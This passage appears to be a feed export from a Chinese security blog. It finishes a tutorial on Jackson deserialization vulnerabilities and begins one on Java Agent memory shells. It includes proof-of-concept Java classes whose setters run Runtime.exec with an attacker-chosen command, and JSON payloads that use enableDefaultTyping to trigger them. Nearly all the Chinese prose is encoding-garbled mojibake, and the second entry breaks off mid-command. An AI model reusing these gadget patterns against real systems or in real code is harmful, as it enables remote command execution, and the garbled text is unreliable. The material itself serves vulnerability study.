å‡½æ•°ä¸­å¾€ä¸‹æ‰§è¡Œï¼Œç”¨åˆšåˆšè·å–åˆ°çš„ååºåˆ—åŒ–å™¨æ¥è§£æ sex å±æ€§ä¸­æ•°ç»„å†…çš„å…·ä½“ç±»å‹å®ä¾‹ï¼š</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/finaldeserialize.png" class><p>è¿™é‡Œçš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œåˆ¤æ–­ç›®å‰è¿™ä¸ªæ•°æ®ç±»å‹æ˜¯å¦å·²ç»æœ‰å¯¹åº”çš„ååºåˆ—åŒ–å¤„ç†å™¨äº†ï¼Œå¦‚æœæ²¡æœ‰åˆ™æœ€ç»ˆè¿˜æ˜¯èµ°åŸæ¥é‚£ä¸€å¥—ï¼Œå¦‚æœæœ‰çš„è¯åˆ™èµ° Jackson è‡ªå·±çš„è§„åˆ™ã€‚</p><p>è‡³äºåç»­çš„é€»è¾‘å’Œæœ€å¼€å§‹çš„ååºåˆ—åŒ–é€»è¾‘æ˜¯å¾ˆç±»ä¼¼çš„ï¼Œç®€å•çœ‹ä¸€ä¸‹å…³é”®éƒ¨åˆ†çš„è°ƒç”¨æ ˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;: <span class="number">8</span>, MySex2 (com. drunkbaby. deserialization)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">423</span>, Constructor (java.lang.reflect)</span><br><span class="line">call:<span class="number">119</span>, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createUsingDefault:<span class="number">243</span>, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">vanillaDeserialize:<span class="number">249</span>, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:<span class="number">125</span>, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:<span class="number">110</span>, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br></pre></td></tr></table></figure><p>åç»­è¿‡ç¨‹å°±ä¸å†å±•å¼€äº†ï¼Œæ˜¯ç›¸ä¼¼çš„è°ƒç”¨è¿‡ç¨‹ã€‚</p><p>è‡³æ­¤ï¼Œæ•´ä¸ªå‡½æ•°è°ƒç”¨è¿‡ç¨‹å¤§è‡´è¿‡äº†ä¸€éã€‚ä½¿ç”¨@JsonTypeInfo æ³¨è§£çš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p><ul><li>ç®€å•æ¢³ç†ä¸€éï¼ŒJackson ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸ºï¼Œå…ˆè°ƒç”¨é€šè¿‡æ— å‚çš„æ„é€ å‡½æ•°ç”Ÿæˆç›®æ ‡ç±»å®ä¾‹ï¼Œæ¥ç€æ˜¯æ ¹æ®å±æ€§å€¼æ˜¯å¦æ˜¯æ•°ç»„çš„å½¢å¼å³æ˜¯å¦å¸¦ç±»åæ¥åˆ†åˆ«è°ƒç”¨ä¸åŒçš„å‡½æ•°æ¥è®¾ç½®å®ä¾‹çš„å±æ€§å€¼ï¼Œå…¶ä¸­ä¼šè°ƒç”¨ Object ç±»å‹å±æ€§çš„æ„é€ å‡½æ•°å’Œ setter æ–¹æ³•ã€‚</li></ul><h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p><strong>åœ¨ Jackson ååºåˆ—åŒ–ä¸­ï¼Œè‹¥è°ƒç”¨äº† <code>enableDefaultTyping()</code> å‡½æ•°æˆ–ä½¿ç”¨ <code>@JsonTypeInfo</code> æ³¨è§£æŒ‡å®šååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„å±æ€§ä¸º <code>JsonTypeInfo.Id.CLASS</code> æˆ– <code>JsonTypeInfo.Id.MINIMAL_CLASS</code>ï¼Œåˆ™ä¼šè°ƒç”¨è¯¥å±æ€§çš„ç±»çš„æ„é€ å‡½æ•°å’Œ setter æ–¹æ³•ã€‚</strong></p><h2 id="0x04-Jackson-ååºåˆ—åŒ–æ¼æ´"><a href="#0x04-Jackson-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="0x04 Jackson ååºåˆ—åŒ–æ¼æ´"></a>0x04 Jackson ååºåˆ—åŒ–æ¼æ´</h2><h3 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h3><p>æ»¡è¶³ä¸‹é¢ä¸‰ä¸ªæ¡ä»¶ä¹‹ä¸€å³å­˜åœ¨Jacksonååºåˆ—åŒ–æ¼æ´ï¼š</p><ul><li>è°ƒç”¨äº† <code>ObjectMapper.enableDefaultTyping()</code> å‡½æ•°ï¼›</li><li>å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸º <code>JsonTypeInfo.Id.CLASS</code> çš„ <code>@JsonTypeInfo</code> æ³¨è§£ï¼›</li><li>å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸º <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> çš„ <code>@JsonTypeInfo</code> æ³¨è§£ï¼›</li></ul><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>ç”±ä¹‹å‰çš„ç»“è®ºçŸ¥é“ï¼Œå½“ä½¿ç”¨çš„ JacksonPolymorphicDeserialization æœºåˆ¶é…ç½®æœ‰é—®é¢˜æ—¶ï¼ŒJackson ååºåˆ—åŒ–å°±ä¼šè°ƒç”¨å±æ€§æ‰€å±ç±»çš„æ„é€ å‡½æ•°å’Œ setter æ–¹æ³•ã€‚</p><p>è€Œå¦‚æœè¯¥æ„é€ å‡½æ•°æˆ– setter æ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œé‚£ä¹ˆå°±å­˜åœ¨ Jackson ååºåˆ—åŒ–æ¼æ´ã€‚</p><h3 id="æ¼æ´åœºæ™¯åŠ-Demo"><a href="#æ¼æ´åœºæ™¯åŠ-Demo" class="headerlink" title="æ¼æ´åœºæ™¯åŠ Demo"></a>æ¼æ´åœºæ™¯åŠ Demo</h3><p>è¿™é‡Œå¤§è‡´ä»¥è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§æ‰€å±çš„ç±»çš„ç±»å‹åˆ†ä¸ºä¸¤ç§ï¼š</p><h4 id="å±æ€§ä¸ä¸ºObjectç±»æ—¶"><a href="#å±æ€§ä¸ä¸ºObjectç±»æ—¶" class="headerlink" title="å±æ€§ä¸ä¸ºObjectç±»æ—¶"></a>å±æ€§ä¸ä¸ºObjectç±»æ—¶</h4><p><strong>å½“è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§æ‰€å±ç±»çš„æ„é€ å‡½æ•°æˆ– setter æ–¹æ³•æœ¬èº«å­˜åœ¨æ¼æ´æ—¶ï¼Œè¿™ç§åœºæ™¯å­˜åœ¨ Jackson ååºåˆ—åŒ–æ¼æ´ã€‚å½“ç„¶è¿™ç§åœºæ™¯å¼€å‘å‡ ä¹ä¸ä¼šè¿™ä¹ˆå†™ã€‚</strong></p><p>æˆ‘ä»¬çœ‹ä¸ªä¾‹å­ï¼Œç›´æ¥ä¿®æ”¹ MySex ç±»çš„ setSex ()æ–¹æ³•ï¼Œåœ¨å…¶ä¸­æ·»åŠ å‘½ä»¤æ‰§è¡Œæ“ä½œï¼ˆé™¤éç¨‹åºå‘˜è‡ªå·±æƒ³ç•™åé—¨ã€ä¸ç„¶ä¸ä¼šå‡ºç°è¿™ç§å†™æ³•ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilSex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySexæ„é€ å‡½æ•°&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.getSex&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.setSex&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Peson3 ç±»ä¸å˜</p><p>ç¼–å†™ååºåˆ—åŒ–ç±»ï¼Œæ„é€  Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationRun</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.JacksonVul.EvilSex\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å±æ€§ä¸º-Object-ç±»æ—¶"><a href="#å±æ€§ä¸º-Object-ç±»æ—¶" class="headerlink" title="å±æ€§ä¸º Object ç±»æ—¶"></a>å±æ€§ä¸º Object ç±»æ—¶</h4><p><strong>å½“å±æ€§ç±»å‹ä¸º Object æ—¶ï¼Œå› ä¸º Object ç±»å‹æ˜¯ä»»æ„ç±»å‹çš„çˆ¶ç±»ï¼Œå› æ­¤æ‰©å¤§äº†æˆ‘ä»¬çš„æ”»å‡»é¢ï¼Œæˆ‘ä»¬åªéœ€è¦å¯»æ‰¾å‡ºåœ¨ç›®æ ‡æœåŠ¡ç«¯ç¯å¢ƒä¸­å­˜åœ¨çš„ä¸”æ„é€ å‡½æ•°æˆ– setter æ–¹æ³•å­˜åœ¨æ¼æ´ä»£ç çš„ç±»å³å¯è¿›è¡Œæ”»å‡»åˆ©ç”¨ã€‚</strong></p><p>åé¢å‡ºç°çš„ Jackson ååºåˆ—åŒ–çš„ CVE æ¼æ´ã€é»‘åå•ç»•è¿‡ç­‰éƒ½æ˜¯åŸºäºè¿™ä¸ªåŸç†å¯»æ‰¾å„ç§ç¬¦åˆæ¡ä»¶çš„åˆ©ç”¨é“¾ã€‚</p><p>æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ä»£ç </p><p><strong>Evil.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;  </span><br><span class="line">    String cmd;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="built_in">this</span>.cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Person4.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person4</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  </span></span><br><span class="line">    <span class="comment">// æˆ– @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)    public Object object;  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person4</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Person3 æ„é€ å‡½æ•°&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Person3 setter å‡½æ•°&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€ç¼–å†™ååºåˆ—åŒ–ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationObjectRun</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;object\&quot;:[\&quot;com.drunkbaby.JacksonVul.Evil\&quot;,&#123;\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person4</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person4.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/calc2.png" class><h2 id="0x05-å°ç»“"><a href="#0x05-å°ç»“" class="headerlink" title="0x05 å°ç»“"></a>0x05 å°ç»“</h2><p>æ¦‚å¿µè™½ç„¶å¤šï¼Œä½†æ˜¯è‡ªå·±è·Ÿä¸€ä¸‹ä»£ç ï¼Œçœ‹èµ·æ¥è¿˜æ˜¯éå¸¸å¿«çš„ã€‚æ€»è€Œè¨€ä¹‹å°±æ˜¯å¼€å¯äº†ç‰¹æ®Šçš„ååºåˆ—åŒ–è§£ææ–¹å¼æ—¶ï¼Œä¼šè°ƒç”¨ä»»æ„çš„æ„é€ å‡½æ•°ä¸ setter æ–¹æ³•</p><h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" href="http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">Jackson ååºåˆ—åŒ–æ¼æ´åŸç†</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java Agent å†…å­˜é©¬å­¦ä¹ </title>
    <link href="https://drun1baby.github.io/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://drun1baby.github.io/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-12-07T12:05:37.000Z</published>
    <updated>2023-12-07T12:41:10.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯-Java-Agentï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Java-Agentï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Java Agentï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Java Agentï¼Ÿ</h2><p>æˆ‘ä»¬çŸ¥é“Javaæ˜¯ä¸€ç§é™æ€å¼ºç±»å‹è¯­è¨€ï¼Œåœ¨è¿è¡Œä¹‹å‰å¿…é¡»å°†å…¶ç¼–è¯‘æˆ<code>.class</code>å­—èŠ‚ç ï¼Œç„¶åå†äº¤ç»™JVMå¤„ç†è¿è¡Œã€‚Java Agent å°±æ˜¯ä¸€ç§èƒ½åœ¨ä¸å½±å“æ­£å¸¸ç¼–è¯‘çš„å‰æä¸‹ï¼Œä¿®æ”¹ Java å­—èŠ‚ç ï¼Œè¿›è€ŒåŠ¨æ€åœ°ä¿®æ”¹å·²åŠ è½½æˆ–æœªåŠ è½½çš„ç±»ã€å±æ€§å’Œæ–¹æ³•çš„æŠ€æœ¯ã€‚</p><p>å®é™…ä¸Šï¼Œå¹³æ—¶è¾ƒä¸ºå¸¸è§çš„æŠ€æœ¯å¦‚çƒ­éƒ¨ç½²ã€ä¸€äº›è¯Šæ–­å·¥å…·ç­‰éƒ½æ˜¯åŸºäºJava AgentæŠ€æœ¯æ¥å®ç°çš„ã€‚é‚£ä¹ˆJava AgentæŠ€æœ¯å…·ä½“æ˜¯æ€æ ·å®ç°çš„å‘¢ï¼Ÿ</p><p>å¯¹äº Agentï¼ˆä»£ç†ï¼‰æ¥è®²ï¼Œå…¶å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯åœ¨ JVM å¯åŠ¨å‰åŠ è½½çš„<code>premain-Agent</code>ï¼Œå¦ä¸€ç§æ˜¯ JVM å¯åŠ¨ä¹‹ååŠ è½½çš„ <code>agentmain-Agent</code>ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£æˆä¸€ç§ç‰¹æ®Šçš„ Interceptorï¼ˆæ‹¦æˆªå™¨ï¼‰ï¼Œå¦‚ä¸‹å›¾ã€‚</p><p><strong>Premain-Agent</strong></p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/PreAgent.png" class><p><strong>agentmain-Agent</strong></p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentmain-Agent.png" class><h2 id="å‡ ç§-Java-Agent-å®ä¾‹"><a href="#å‡ ç§-Java-Agent-å®ä¾‹" class="headerlink" title="å‡ ç§ Java Agent å®ä¾‹"></a>å‡ ç§ Java Agent å®ä¾‹</h2><h3 id="premain-Agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h3><p>ä»å®˜æ–¹æ–‡æ¡£ä¸­å¯çŸ¥æ™“ï¼Œé¦–å…ˆæˆ‘ä»¬å¿…é¡»å®ç° premain æ–¹æ³•ï¼ŒåŒæ—¶æˆ‘ä»¬ jar æ–‡ä»¶çš„æ¸…å•ï¼ˆmainfestï¼‰ä¸­å¿…é¡»è¦å«æœ‰ Premain-Class å±æ€§</p><p>æˆ‘ä»¬å¯åœ¨å‘½ä»¤è¡Œåˆ©ç”¨Â <strong>-javaagent</strong>Â æ¥å®ç°å¯åŠ¨æ—¶åŠ è½½ã€‚</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/premain.png" class><p>premain æ–¹æ³•é¡¾åæ€ä¹‰ï¼Œä¼šåœ¨æˆ‘ä»¬è¿è¡Œ main æ–¹æ³•ä¹‹å‰è¿›è¡Œè°ƒç”¨ï¼Œå³åœ¨è¿è¡Œ main æ–¹æ³•ä¹‹å‰ä¼šå…ˆå»è°ƒç”¨æˆ‘ä»¬ jar åŒ…ä¸­ Premain-Class ç±»ä¸­çš„ premain æ–¹æ³•</p><p>æˆ‘ä»¬é¦–å…ˆæ¥å®ç°ä¸€ä¸ªç®€å•çš„ <code>premain-Agent</code>ï¼Œåˆ›å»ºä¸€ä¸ª Maven é¡¹ç›®ï¼Œç¼–å†™ä¸€ä¸ªç®€å•çš„ <code>premain-Agent</code>ï¼Œåˆ›å»ºçš„ç±»éœ€è¦å®ç° premain æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.premain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_premain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è°ƒç”¨äº†premain-Agentï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€åœ¨ <code>resource/META-INF/</code> ä¸‹åˆ›å»º <code>agent.MF</code> æ¸…å•æ–‡ä»¶ç”¨ä»¥æŒ‡å®š <code>premain-Agent</code> çš„å¯åŠ¨ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: com.java.premain.agent.Java_Agent_premain</span><br></pre></td></tr></table></figure><p>æ¥ç€ç”¨ jar å‘½ä»¤æ¥æ‰“åŒ…ï¼Œæ­¤æ—¶å¹¶æŒ‡å®šå¯åŠ¨é¡¹ã€‚è¿è¡Œå®Œå‘½ä»¤ä¹‹åå°†ä¼šç”Ÿæˆ agent.jar æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm agent.jar META-INF/maven/agent.MF Java_Agent_premain.class</span><br></pre></td></tr></table></figure><p>æ¥ç€åˆ›å»ºä¸€ä¸ªç›®æ ‡ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œåˆ›å»ºå¯¹åº”çš„ mf å¯åŠ¨é¡¹ï¼Œå–åä¸º <code>hello.mf</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Main-Class: Hello</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„æ‰“åŒ…æ–¹å¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm hello.jar META-INF/maven/hello.mf Hello.class</span><br></pre></td></tr></table></figure><p>è‡³æ­¤æˆ‘ä»¬çš„å‡†å¤‡å·¥ä½œå·²ç»åšå®Œäº†ï¼Œæœ€ç»ˆå¾—åˆ°äº† agent.jar å’Œ hello.jar</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦åœ¨Â <code>java -jar</code>Â ä¸­æ·»åŠ Â <code>-javaagent:agent.jar</code>Â å³å¯åœ¨å¯åŠ¨æ—¶ä¼˜å…ˆåŠ è½½ agent , è€Œä¸”å¯åˆ©ç”¨å¦‚ä¸‹æ–¹å¼è·å–ä¼ å…¥æˆ‘ä»¬çš„ agentArgs å‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java 